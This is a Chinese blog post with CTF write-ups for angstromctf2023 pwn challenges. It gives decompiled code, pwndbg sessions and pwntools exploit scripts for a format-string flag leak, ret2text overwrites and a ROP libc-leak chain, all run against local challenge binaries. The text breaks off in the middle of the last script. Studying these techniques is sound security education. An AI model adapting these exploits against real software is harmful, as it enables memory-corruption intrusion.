@@ -1,0 +1,2211 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    ztree
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://fastly.jsdelivr.net">
+<meta name="author" content="ztree">
+<meta name="description" content="竹杖芒鞋轻胜马，谁怕？一蓑烟雨任平生。">
+<meta name="keywords" content="Binary">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://lzxzl.github.io/styles/main.css" />
+<link href="https://fastly.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                        <!--CDN样式-->
+                        <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://lzxzl.github.io">
+                    ztree
+                </a>
+            </div>
+            <div id="tp-weather-widget"></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/">
+                        首页
+                    </a>
+                    
+                    <a class="menu-item" href="/archives">
+                        归档
+                    </a>
+                    
+                    <a class="menu-item" href="/tags">
+                        标签
+                    </a>
+                    
+                    <a class="menu-item" href="/post/about">
+                        关于
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1747748455692" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://lzxzl.github.io">
+                            ztree
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1747748455692" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="/">
+                            首页
+                        </a>
+                        
+                        <a class="menu-item" href="/archives">
+                            归档
+                        </a>
+                        
+                        <a class="menu-item" href="/tags">
+                            标签
+                        </a>
+                        
+                        <a class="menu-item" href="/post/about">
+                            关于
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+
+
+
+    <script>
+        (function(a, h, g, f, e, d, c, b) {
+            b = function() {
+                d = h.createElement(g);
+                c = h.getElementsByTagName(g)[0];
+                d.src = e;
+                d.charset = "utf-8";
+                d.async = 1;
+                c.parentNode.insertBefore(d, c)
+            };
+            a["SeniverseWeatherWidgetObject"] = f;
+            a[f] || (a[f] = function() {
+                (a[f].q = a[f].q || []).push(arguments)
+            });
+            a[f].l = +new Date();
+            if (a.attachEvent) {
+                a.attachEvent("onload", b)
+            } else {
+                a.addEventListener("load", b, false)
+            }
+        }(window, document, "script", "SeniverseWeatherWidget", "//cdn.sencdn.com/widget2/static/js/bundle.js?t=" + parseInt((new Date().getTime() / 100000000).toString(), 10)));
+        window.SeniverseWeatherWidget('show', {
+            flavor: "slim",
+            location: "WWEFQFPJZ7T8",
+            geolocation: true,
+            language: "auto",
+            unit: "c",
+            theme: "auto",
+            token: "61bcc333-3305-4728-9465-6785274bb0a3",
+            hover: "enabled",
+            container: "tp-weather-widget"
+        })
+    </script>
+    
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                angstromctf2023 - pwn
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            ztree
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2023-07-16</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">61.4
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">11630</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://lzxzl.github.io/tag/ctf/">ctf</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <blockquote>
+<p>因为某原因，最近要看看ctf。</p>
+<p><a href="https://2023.angstromctf.com/challenges">angstromctf2023</a>早在4月就结束了。今天打开一看，诶，还能访问。那就下载下来做一做。</p>
+<p>另外，搜到了一个<a href="https://www.youtube.com/watch?v=jqF4Sgi4Ars">youtube视频</a>专门讲这个比赛的wp，下面的记录，以及pwn环境（docker）很多参考了这个视频。毕竟菜。</p>
+</blockquote>
+<h1 id="1-queue">1 queue</h1>
+<blockquote>
+<p>I just learned about stacks and queues in DSA!</p>
+</blockquote>
+<h2 id="11-运行">1.1 运行</h2>
+<pre><code class="language-shell"># 开启了canary
+❯ make checksec
+docker run -it --rm -v &quot;`pwd`:/chal&quot; ubuntu-demo checksec --file=queue
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   46) Symbols	  No	0		2		queue
+</code></pre>
+<pre><code class="language-shell">root@43fe6eff178b:/chal# ./queue
+Error: missing flag.txt.
+root@43fe6eff178b:/chal# echo &quot;flag{aaaaaaaaaa}&quot; &gt;&gt; flag.txt
+root@43fe6eff178b:/chal# ./queue
+What did you learn in class today? math
+Oh nice, math
+sounds pretty cool!root@43fe6eff178b:/chal#
+</code></pre>
+<h2 id="12-反编译">1.2 反编译</h2>
+<pre><code class="language-shell">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __gid_t rgid; // [rsp+4h] [rbp-CCh]
+  FILE *stream; // [rsp+8h] [rbp-C8h]
+  char format[48]; // [rsp+10h] [rbp-C0h] BYREF
+  char s[136]; // [rsp+40h] [rbp-90h] BYREF
+  unsigned __int64 v9; // [rsp+C8h] [rbp-8h]
+
+  v9 = __readfsqword(0x28u);
+  setbuf(_bss_start, 0LL);
+  rgid = getegid();
+  setresgid(rgid, rgid, rgid);
+  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);              // 打开flag.txt
+  if ( !stream )
+  {
+    puts(&quot;Error: missing flag.txt.&quot;);           // 检查flag.txt是否存在
+    exit(1);
+  }
+  fgets(s, 128, stream);                        // 从flag.txt读取内容，存在s里
+  printf(&quot;What did you learn in class today? &quot;);
+  fgets(format, 48, stdin);                     // 从stdin读取内容，存在format里
+  printf(&quot;Oh nice, &quot;);
+  printf(format);                               // 明显的格式化字符串漏洞
+  printf(&quot;sounds pretty cool!&quot;);
+  return v9 - __readfsqword(0x28u);
+}
+</code></pre>
+<h2 id="13-调试">1.3 调试</h2>
+<p>太久没做pwn题了，来看一眼。</p>
+<p>调试的时候输入：<code>AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code></p>
+<pre><code class="language-shell">pwndbg&gt;
+0x00005604ada7735b in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────
+*RAX  0x0
+ RBX  0x0
+ RCX  0x7f2d801efa37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x0
+ RDI  0x7fff78b48960 ◂— 'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'
+ RSI  0x7fff78b46830 ◂— 'Oh nice, you learn in class today? '
+ R8   0x9
+ R9   0x5604aec8d490 ◂— 'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n'
+ R10  0x5604ada78054 ◂— 'Oh nice, '
+ R11  0x246
+ R12  0x7fff78b48b38 —▸ 0x7fff78b4a8dd ◂— '/chal/queue'
+ R13  0x5604ada77249 (main) ◂— endbr64
+ R14  0x5604ada79d80 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5604ada77200 (__do_global_dtors_aux) ◂— endbr64
+ R15  0x7f2d80344040 (_rtld_global) —▸ 0x7f2d803452e0 —▸ 0x5604ada76000 ◂— 0x10102464c457f
+ RBP  0x7fff78b48a20 ◂— 0x1
+ RSP  0x7fff78b48950 ◂— 0x0
+*RIP  0x5604ada7735b (main+274) ◂— call 0x5604ada77110
+─────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────
+   0x5604ada77342 &lt;main+249&gt;    mov    eax, 0
+   0x5604ada77347 &lt;main+254&gt;    call   printf@plt                &lt;printf@plt&gt;
+
+   0x5604ada7734c &lt;main+259&gt;    lea    rax, [rbp - 0xc0]
+   0x5604ada77353 &lt;main+266&gt;    mov    rdi, rax
+   0x5604ada77356 &lt;main+269&gt;    mov    eax, 0
+ ► 0x5604ada7735b &lt;main+274&gt;    call   printf@plt                &lt;printf@plt&gt;
+        format: 0x7fff78b48960 ◂— 'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'
+        vararg: 0x7fff78b46830 ◂— 'Oh nice, you learn in class today? '
+
+   0x5604ada77360 &lt;main+279&gt;    lea    rax, [rip + 0xcf7]
+   0x5604ada77367 &lt;main+286&gt;    mov    rdi, rax
+   0x5604ada7736a &lt;main+289&gt;    mov    eax, 0
+   0x5604ada7736f &lt;main+294&gt;    call   printf@plt                &lt;printf@plt&gt;
+
+   0x5604ada77374 &lt;main+299&gt;    nop
+──────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff78b48950 ◂— 0x0
+01:0008│     0x7fff78b48958 —▸ 0x5604aec8c2a0 ◂— 0xfbad2488
+02:0010│ rdi 0x7fff78b48960 ◂— 'AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'
+03:0018│     0x7fff78b48968 ◂— '.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'
+04:0020│     0x7fff78b48970 ◂— 'p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'
+05:0028│     0x7fff78b48978 ◂— '%p.%p.%p.%p.%p.%p.%p.%p'
+06:0030│     0x7fff78b48980 ◂— '.%p.%p.%p.%p.%p'
+07:0038│     0x7fff78b48988 ◂— 0x70252e70252e70 /* 'p.%p.%p' */
+────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5604ada7735b main+274
+   1   0x7f2d80104d90 __libc_start_call_main+128
+   2   0x7f2d80104e40 __libc_start_main+128
+   3   0x5604ada77185 _start+37
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg&gt; x/20gx $rsp
+0x7fff78b48950:	0x0000000000000000	0x00005604aec8c2a0
+0x7fff78b48960:	0x4141414141414141	0x252e70252e70252e
+0x7fff78b48970:	0x2e70252e70252e70	0x70252e70252e7025
+0x7fff78b48980:	0x252e70252e70252e	0x0070252e70252e70
+0x7fff78b48990:	0x6161617b67616c66	0x000a7d6161616161
+0x7fff78b489a0:	0x0000000000000000	0x0000000000000000
+0x7fff78b489b0:	0x0000000000000000	0x0000000000000000
+0x7fff78b489c0:	0x0000000000000000	0x0000000000000000
+0x7fff78b489d0:	0x0000000000000000	0x0000000000000000
+0x7fff78b489e0:	0x0000000000000000	0x0000000000000000
+pwndbg&gt; c
+Continuing.
+AAAAAAAA.0x7fff78b46830.(nil).0x7f2d801efa37.0x9.0x5604aec8d490.(nil).0x5604aec8c2a0.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70sounds pretty cool![Inferior 1 (process 51) exited normally]
+</code></pre>
+<p>看一下打印结果：</p>
+<pre><code class="language-shell">rdi     .rsi[1]        .rdx[2].rcx[3]       .r8[4].r9[5]   
+AAAAAAAA.0x7fff78b46830.(nil).0x7f2d801efa37.0x9.0x5604aec8d490.(nil).0x5604aec8c2a0.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70
+</code></pre>
+<p>栈里数一下：</p>
+<pre><code class="language-shell">pwndbg&gt; x/20gx $rsp
+0x7fff78b48950:	0x0000000000000000	0x00005604aec8c2a0  [6.7]
+0x7fff78b48960:	0x4141414141414141	0x252e70252e70252e  [8.9]
+0x7fff78b48970:	0x2e70252e70252e70	0x70252e70252e7025  [10.11]
+0x7fff78b48980:	0x252e70252e70252e	0x0070252e70252e70  [12.13]
+0x7fff78b48990:	0x6161617b67616c66	0x000a7d6161616161  [14.15]
+0x7fff78b489a0:	0x0000000000000000	0x0000000000000000
+0x7fff78b489b0:	0x0000000000000000	0x0000000000000000
+0x7fff78b489c0:	0x0000000000000000	0x0000000000000000
+0x7fff78b489d0:	0x0000000000000000	0x0000000000000000
+0x7fff78b489e0:	0x0000000000000000	0x0000000000000000
+</code></pre>
+<p>验证一下：</p>
+<pre><code class="language-shell">root@43fe6eff178b:/chal# ./queue
+What did you learn in class today? %15$p
+Oh nice, 0xa7d6161616161
+sounds pretty cool!root@43fe6eff178b:/chal#
+</code></pre>
+<h2 id="14-exp">1.4 exp</h2>
+<pre><code class="language-python">from pwn import *
+import warnings
+
+warnings.filterwarnings(action='ignore', category=BytesWarning)
+
+s       = lambda data               :p.send(data)
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+ruf     = lambda delims, drop=False :p.recvuntil(delims, drop)
+uu64    = lambda data               :u64(data.ljust(8,'\x00'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+logsucc = lambda info               :log.success(info)
+itr     = lambda                    :p.interactive()
+
+context.log_level = 'DEBUG'
+#context.terminal=['tmux', 'spilit-window', '-h']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+flag = &quot;&quot;
+# 因为我写的flag是16字节，所以这里范围选择[14,16)。根据实际情况更改
+for i in range(14,16):
+    p = process(&quot;./queue&quot;)
+
+    myformat = &quot;%{j}$p&quot;.format(j=i)
+    logsucc(myformat)
+    sla(b'today? ', myformat.encode())
+    ru(b'Oh nice, 0x')
+
+    data = ru(b'\nsounds', drop=True)
+
+    flag += bytes.fromhex(data.decode()).decode()[::-1]
+    logsucc(flag)
+    p.close()
+
+logsucc(flag)
+</code></pre>
+<pre><code class="language-shell">root@9aea9b3d9446:/chal# python3 exp.py
+[+] Starting local process './queue' argv=[b'./queue'] : pid 87
+[+] %14$p
+[DEBUG] Received 0x23 bytes:
+    b'What did you learn in class today? '
+[DEBUG] Sent 0x6 bytes:
+    b'%14$p\n'
+[DEBUG] Received 0x2f bytes:
+    b'Oh nice, 0x6161617b67616c66\n'
+    b'sounds pretty cool!'
+[+] flag{aaa
+[*] Process './queue' stopped with exit code 0 (pid 87)
+[+] Starting local process './queue' argv=[b'./queue'] : pid 89
+[+] %15$p
+[DEBUG] Received 0x23 bytes:
+    b'What did you learn in class today? '
+[DEBUG] Sent 0x6 bytes:
+    b'%15$p\n'
+[DEBUG] Received 0x2f bytes:
+    b'Oh nice, 0x7d61616161616161\n'
+    b'sounds pretty cool!'
+[+] flag{aaaaaaaaaa}
+[*] Process './queue' stopped with exit code 0 (pid 89)
+[+] flag{aaaaaaaaaa}
+</code></pre>
+<h1 id="2-gaga">2 gaga</h1>
+<blockquote>
+<p>Multipart challenge!</p>
+<p>Note all use essentially the same Dockerfile. The flags are split among all three challenges. If you are already a pwn expert, the last challenge has the entire flag.</p>
+</blockquote>
+<h2 id="21-运行">2.1 运行</h2>
+<p>先看一眼Dockerfile，仍然需要<code>flag.txt</code></p>
+<pre><code class="language-Dockerfile">FROM pwn.red/jail
+
+COPY --from=ubuntu:20.04 / /srv
+COPY gaga2 /srv/app/run
+COPY flag.txt /srv/app/flag.txt
+RUN chmod 755 /srv/app/run
+</code></pre>
+<pre><code class="language-shell">root@870aeb6e392e:/chal# ls
+Dockerfile  Makefile  gaga0  gaga1  gaga2
+root@870aeb6e392e:/chal# echo &quot;flag{aaaaaaaaaa}&quot; &gt;&gt; flag.txt
+root@870aeb6e392e:/chal# ./gaga0
+Welcome to gaga!
+This challenge is meant to guide you through an introduction to binary exploitation.
+
+Right now, you are on stage0. Your goal is to redirect program control to win0, which is at address 0x401236.
+Your input: aaa
+root@870aeb6e392e:/chal# ./gaga1
+Nice!
+Now you need to call the win1 function with the correct arguments.
+Your input: aaa
+root@870aeb6e392e:/chal# ./gaga2
+Awesome! Now there's no system(), so what will you do?!
+Your input: aaa
+
+# Canary、PIE关了，NX开了
+root@870aeb6e392e:/chal# checksec --file=gaga0
+[*] '/chal/gaga0'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<h2 id="22-反编译分析">2.2 反编译&amp;分析</h2>
+<h3 id="gaga0">gaga0</h3>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[60]; // [rsp+0h] [rbp-40h] BYREF  距离rbp有0x40的长度
+  __gid_t rgid; // [rsp+3Ch] [rbp-4h]
+
+  setbuf(_bss_start, 0LL);
+  rgid = getegid();
+  setresgid(rgid, rgid, rgid);
+  puts(&quot;Welcome to gaga!&quot;);
+  puts(&quot;This challenge is meant to guide you through an introduction to binary exploitation.&quot;);
+  printf(
+    &quot;\nRight now, you are on stage0. Your goal is to redirect program control to win0, which is at address %p.\n&quot;,
+    win0);
+  printf(&quot;Your input: &quot;);
+  return gets(v4); // return 输入？
+}
+</code></pre>
+<p>根据打印提示，看看win0函数。如下，直接打印flag：</p>
+<pre><code class="language-c">int win0()
+{
+  char s[136]; // [rsp+0h] [rbp-90h] BYREF
+  FILE *stream; // [rsp+88h] [rbp-8h]
+
+  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if ( !stream )
+  {
+    puts(&quot;Error: missing flag.txt.&quot;);
+    exit(1);
+  }
+  fgets(s, 128, stream);
+  return puts(s);
+}
+</code></pre>
+<p>那就简单了，Canary啥的都关了，最简单的ret2text。就不调试了，根据IDA的注释，偏移等于0x40+0x8=0x48，先用这个写exp，有问题再说。</p>
+<h4 id="exp">exp</h4>
+<pre><code class="language-python">from pwn import *
+import warnings
+
+warnings.filterwarnings(action='ignore', category=BytesWarning)
+
+s       = lambda data               :p.send(data)
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+ruf     = lambda delims, drop=False :p.recvuntil(delims, drop)
+uu64    = lambda data               :u64(data.ljust(8,'\x00'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+logsucc = lambda info               :log.success(info)
+itr     = lambda                    :p.interactive()
+
+context.log_level = 'DEBUG'
+#context.terminal=['tmux', 'spilit-window', '-h']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+elf = ELF(&quot;./gaga0&quot;)
+p = process(&quot;./gaga0&quot;)
+
+logsucc(hex(elf.symbols['win0']))
+payload = b'a'*0x48+ p64(elf.symbols['win0'])
+sla(&quot;Your input: &quot;, payload)
+
+itr()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230709021923.png" alt="image-20230709021921835" loading="lazy"></figure>
+<h3 id="gaga1">gaga1</h3>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[60]; // [rsp+0h] [rbp-40h] BYREF
+  __gid_t rgid; // [rsp+3Ch] [rbp-4h]
+
+  setbuf(_bss_start, 0LL);
+  rgid = getegid();
+  setresgid(rgid, rgid, rgid);
+  puts(&quot;Nice!&quot;);
+  puts(&quot;Now you need to call the win1 function with the correct arguments.&quot;);
+  printf(&quot;Your input: &quot;);
+  return gets(v4);
+}
+</code></pre>
+<pre><code class="language-c">void __fastcall win1(int a1, int a2)
+{
+  char s[136]; // [rsp+10h] [rbp-90h] BYREF
+  FILE *stream; // [rsp+98h] [rbp-8h]
+
+  if ( a1 == 4919 || a2 == 16705 )
+  {
+    stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+    if ( !stream )
+    {
+      puts(&quot;Error: missing flag.txt.&quot;);
+      exit(1);
+    }
+    fgets(s, 128, stream);
+    puts(s);
+  }
+}
+</code></pre>
+<p>和gaga0基本一样，只不过在外面加了个<code>if(a1 == 4919 || a2 == 16705)</code>。简单，直接把main的ret覆盖成if判断后的地址<code>0x401269</code>：</p>
+<pre><code class="language-assembly">.text:000000000040125D                 cmp     [rbp+var_98], 4141h
+.text:0000000000401267                 jnz     short loc_4012C6
+.text:0000000000401269
+.text:0000000000401269 loc_401269:                             ; CODE XREF: win1+25↑j
+.text:0000000000401269                 lea     rsi, modes      ; &quot;r&quot;
+.text:0000000000401270                 lea     rdi, filename   ; &quot;flag.txt&quot;
+.text:0000000000401277                 call    _fopen
+</code></pre>
+<p>exp修改如下：</p>
+<pre><code class="language-python">p = process(&quot;./gaga1&quot;)
+
+#gdb.attach(p, gdbscript='b main')
+payload = b'a'*0x48 + p64(0x401269)
+sla(&quot;Your input: &quot;, payload)
+
+itr()
+</code></pre>
+<p>然后执行后失败了，gdb调试，找到问题所在。如下图，前面覆盖ret的时候没关注rbp，直接覆盖成<code>aaaaaaaa</code>。而在这里会用到rbp，非法地址导致crash：</p>
+<figure data-type="image" tabindex="2"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230710212327.png" alt="image-20230710212325216" loading="lazy"></figure>
+<p>解决办法就是将rbp覆盖成一个可读可写的地址。gdb调一下，在可读可写的地址里随便选一个，比如<code>0x404100</code></p>
+<pre><code class="language-shell">pwndbg&gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+             Start                End Perm     Size Offset File
+          0x400000           0x401000 r--p     1000      0 /chal/gaga1
+          0x401000           0x402000 r-xp     1000   1000 /chal/gaga1
+          0x402000           0x403000 r--p     1000   2000 /chal/gaga1
+          0x403000           0x404000 r--p     1000   2000 /chal/gaga1
+          0x404000           0x405000 rw-p     1000   3000 /chal/gaga1   &lt;---这一行选个地址
+    0x7fd81cbc9000     0x7fd81cbcc000 rw-p     3000      0 [anon_7fd81cbc9]
+    0x7fd81cbcc000     0x7fd81cbf4000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
+</code></pre>
+<p>最终的exp如下：</p>
+<pre><code class="language-python">p = process(&quot;./gaga1&quot;)
+
+payload = b'a'*0x40 + p64(0x404400) + p64(0x401269)
+sla(&quot;Your input: &quot;, payload)
+
+itr()
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://l-tuchuang.oss-cn-beijing.aliyuncs.com/img/20230710213348.png" alt="image-20230710213345891" loading="lazy"></figure>
+<h3 id="gaga2">gaga2</h3>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[60]; // [rsp+0h] [rbp-40h] BYREF
+  __gid_t rgid; // [rsp+3Ch] [rbp-4h]
+
+  setbuf(_bss_start, 0LL);
+  rgid = getegid();
+  setresgid(rgid, rgid, rgid);
+  puts(&quot;Awesome! Now there's no system(), so what will you do?!&quot;);
+  printf(&quot;Your input: &quot;);
+  return gets(v4);
+}
+</code></pre>
+<p>这次没有“后门函数”了，查看一下保护机制：</p>
+<pre><code class="language-shell">root@e289eaa0da06:/chal# checksec gaga2
+[*] '/chal/gaga2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>关了PIE，开了NX，不能ret2shellcode，那就rop吧。以前一直用<code>ROPGadget</code>/<code>one_gadget</code>这些工具，这次试试pwntools里的rop模块。要说的都在注释里了，看代码吧：</p>
+<pre><code class="language-python">from pwn import *
+import warnings
+
+warnings.filterwarnings(action='ignore', category=BytesWarning)
+
+s       = lambda data               :p.send(data)
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+ruf     = lambda delims, drop=False :p.recvuntil(delims, drop)
+rl      = lambda drop=True          :p.recvline(drop)
+rlf     = lambda drop=False         :p.recvline(drop)
+uu64    = lambda data               :u64(data.ljust(8,'\x00'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+logsucc = lambda info               :log.success(info)
+itr     = lambda                    :p.interactive()
+
+context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序
+context.log_level = 'DEBUG'
+#context.terminal=['tmux', 'spilit-window', '-h']
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+
+elf = ELF(&quot;./gaga2&quot;)
+p = process(&quot;./gaga2&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+# step1: leak libc base addr
+# logsucc(hex(elf.got[&quot;printf&quot;]))
+rop = ROP(elf) #  创建一个 rop 对象，这时 rop 链还是空的，需要在其中添加函数
+rop.puts(elf.got[&quot;printf&quot;]) # 等价于 rop.call('puts', (elf.got[&quot;printf&quot;],))
+rop.main() # 回到main函数，那就可以再输入一次了
+print(rop.dump())
+
+payload = b'a'*0x48 + rop.chain() # rop.chain() : 返回当前的字节序列，即 payload
